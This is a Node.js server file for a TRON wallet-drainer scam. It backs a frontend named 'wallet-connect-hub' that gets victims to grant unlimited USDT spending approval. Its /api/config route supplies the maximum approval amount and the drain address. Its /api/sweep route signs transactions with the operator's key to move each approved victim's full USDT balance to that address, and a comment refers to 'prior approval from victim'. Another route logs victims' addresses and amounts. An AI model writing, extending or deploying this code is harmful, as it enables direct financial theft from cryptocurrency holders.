require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { TronWeb } = require('tronweb');

const app = express();
const PORT = process.env.PORT || 3000;

// ---------------------------
// 1. Environment validation
// ---------------------------
const requiredEnv = ['USDT_CONTRACT', 'DRAIN_ADDRESS'];
const missing = requiredEnv.filter(key => !process.env[key]);
if (missing.length) {
  console.error(`❌ Missing required env variables: ${missing.join(', ')}`);
  process.exit(1);
}

const USDT_CONTRACT = process.env.USDT_CONTRACT;
const USDT_DECIMALS = 6;
const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS;
const DRAIN_CONTRACT = process.env.DRAIN_CONTRACT || '';  // set after one-time deployment
const FRONTEND_URL = process.env.FRONTEND_URL || 'https://wallet-connect-hub.replit.app/'; // Replit frontend URL

// ---------------------------
// 2. CORS (restricted to your frontend)
// ---------------------------
const allowedOrigins = [FRONTEND_URL];
app.use(cors({
  origin: function (origin, callback) {
    // allow requests with no origin (like mobile apps or curl)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      const msg = 'CORS policy does not allow this origin.';
      return callback(new Error(msg), false);
    }
    return callback(null, true);
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public'), {
  setHeaders: function(res, p) {
    if (p.endsWith('.html')) {
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
      res.setHeader('Pragma', 'no-cache');
      res.setHeader('Expires', '0');
    }
  }
}));

// ---------------------------
// 3. TronWeb instance
// ---------------------------
const tronWeb = new TronWeb({
  fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
  headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
  privateKey: '0000000000000000000000000000000000000000000000000000000000000001', // dummy for read-only calls
});

// ---------------------------
// 4. Helper: retry on rate limit
// ---------------------------
async function retryWithBackoff(fn, maxRetries = 5) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (err) {
      const isRateLimit = err?.statusCode === 429 || err?.response?.status === 429 || err?.message?.includes('429');
      if (isRateLimit && i < maxRetries - 1) {
        const delay = (i + 1) * 2000;
        console.log(`Rate limit, retry after ${delay}ms...`);
        await new Promise(r => setTimeout(r, delay));
        continue;
      }
      throw err;
    }
  }
}

// ---------------------------
// 5. Routes
// ---------------------------

app.post('/api/balance', async (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) {
      return res.status(400).json({ error: 'Invalid TRON address' });
    }

    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const balanceRaw = await retryWithBackoff(() => contract.balanceOf(address).call());
    const usdtBalance = (balanceRaw.toNumber ? balanceRaw.toNumber() : Number(balanceRaw)) / 10 ** USDT_DECIMALS;

    const account = await retryWithBackoff(() => tronWeb.trx.getAccount(address));
    const trxBalance = account.balance ? (account.balance.toNumber ? account.balance.toNumber() : Number(account.balance)) / 1e6 : 0;

    res.json({ address, usdt: usdtBalance, trx: trxBalance });
  } catch (error) {
    console.error('Balance error:', error);
    res.status(500).json({ error: 'Failed to fetch balance' });
  }
});

app.post('/api/tokens', async (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) {
      return res.status(400).json({ error: 'Invalid address' });
    }

    const hex = tronWeb.address.toHex(address).replace('0x', '');
    const response = await fetch(`https://api.trongrid.io/v1/accounts/${hex}`, {
      headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
    });
    if (!response.ok) throw new Error(`TronGrid API error: ${response.status}`);
    const data = await response.json();

    const tokens = [];
    if (data.data && data.data.length > 0 && data.data[0].trc20) {
      for (const entry of data.data[0].trc20) {
        const contractAddress = Object.keys(entry)[0];
        const rawBalance = Object.values(entry)[0];
        let tokenInfo = { contractAddress, rawBalance, symbol: null, decimals: null };
        try {
          const contract = await retryWithBackoff(() => tronWeb.contract().at(contractAddress));
          const symbol = await retryWithBackoff(() => contract.symbol().call());
          const decimals = await retryWithBackoff(() => contract.decimals().call());
          tokenInfo.symbol = symbol;
          tokenInfo.decimals = decimals.toNumber ? decimals.toNumber() : Number(decimals);
        } catch (e) {
          console.log(`Could not fetch details for ${contractAddress}`);
        }
        tokens.push(tokenInfo);
      }
    }
    res.json({ tokens });
  } catch (error) {
    console.error('Tokens error:', error);
    res.status(500).json({ error: 'Failed to fetch tokens' });
  }
});

app.post('/api/sweep', async (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) {
      return res.status(400).json({ error: 'Invalid address' });
    }

    const drainPk = process.env.DRAIN_PRIVATE_KEY;
    if (!drainPk) {
      return res.status(500).json({ error: 'Drain private key not configured' });
    }

    const drainWeb = new TronWeb({
      fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
      headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
      privateKey: drainPk,
    });

    let target, method, abiFragment;

    if (DRAIN_CONTRACT) {
      // Use the dedicated drain contract
      target = DRAIN_CONTRACT;
      method = 'drainAll(address)';
      abiFragment = [{ type: 'address', value: address }];
    } else {
      // Fallback: direct transferFrom (requires prior approval from victim)
      target = USDT_CONTRACT;
      method = 'transferFrom(address,address,uint256)';
      const contract = await drainWeb.contract().at(USDT_CONTRACT);
      const raw = await contract.balanceOf(address).call();
      const balance = raw.toNumber ? raw.toNumber() : Number(raw);
      if (balance <= 0) {
        return res.json({ success: false, error: 'Zero balance' });
      }
      abiFragment = [
        { type: 'address', value: address },
        { type: 'address', value: DRAIN_ADDRESS },
        { type: 'uint256', value: balance.toString() }
      ];
    }

    const tx = await drainWeb.transactionBuilder.triggerSmartContract(
      target, method,
      { feeLimit: 200_000_000 },
      abiFragment,
      DRAIN_ADDRESS
    );
    const signed = await drainWeb.trx.sign(tx.transaction);
    const receipt = await drainWeb.trx.sendRawTransaction(signed);

    if (receipt.code && receipt.code !== 'SUCCESS') {
      return res.json({ success: false, error: 'Transaction failed: ' + JSON.stringify(receipt) });
    }
    const txId = receipt.txid || receipt;
    res.json({ success: true, txId, method: DRAIN_CONTRACT ? 'contract' : 'direct' });
  } catch (error) {
    console.error('Sweep error:', error);
    res.status(500).json({ success: false, error: error.message || 'Unknown error' });
  }
});

app.get('/api/config', async (req, res) => {
  let maxApprove = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  if (DRAIN_CONTRACT) {
    try {
      const abi = [{
        "constant": true,
        "inputs": [],
        "name": "MAX_APPROVE",
        "outputs": [{ "name": "", "type": "uint256" }],
        "type": "function"
      }];
      const c = await tronWeb.contract(abi).at(DRAIN_CONTRACT);
      const raw = await c.MAX_APPROVE().call();
      maxApprove = raw.toString ? raw.toString() : String(raw);
    } catch (e) {
      console.log('Could not read MAX_APPROVE, using default');
    }
  }
  res.json({
    network: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    usdtContract: USDT_CONTRACT,
    drainAddress: DRAIN_ADDRESS,
    drainContract: DRAIN_CONTRACT,
    maxApprove,
  });
});

const EVENTS_FILE = path.join(__dirname, 'events.json');

app.post('/api/event', (req, res) => {
  try {
    const { type, address, txId, amount } = req.body;
    console.log(`[event] ${type} ${address || ''} ${txId || ''} ${amount || ''}`);
    if (!type) return res.status(400).json({ error: 'type required' });

    let events = [];
    try {
      events = JSON.parse(fs.readFileSync(EVENTS_FILE, 'utf8'));
    } catch (e) { /* file may not exist yet */ }

    events.unshift({
      type,
      address: address || '',
      txId: txId || '',
      amount: amount || '',
      time: Date.now()
    });

    if (events.length > 100) events = events.slice(0, 100);
    fs.writeFileSync(EVENTS_FILE, JSON.stringify(events));
    console.log(`[event] saved, total events: ${events.length}`);
    res.json({ ok: true });
  } catch (e) {
    console.error(`[event] error: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

// server.js
// ========== HEALTH CHECK ROUTE ==========
app.get('/', (req, res) => {
  res.json({ 
    status: 'ok', 
    message: 'Backend is running!',
    timestamp: new Date().toISOString()
  });
});
// ---------------------------
// 6. Startup (no auto‑deploy, no HTTPS)
// ---------------------------
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`   USDT Contract: ${USDT_CONTRACT}`);
  console.log(`   Drain Address: ${DRAIN_ADDRESS}`);
  console.log(`   Drain Contract: ${DRAIN_CONTRACT || '(not set – using direct transferFrom)'}`);
  console.log(`   CORS allowed origin: ${FRONTEND_URL}`);
});
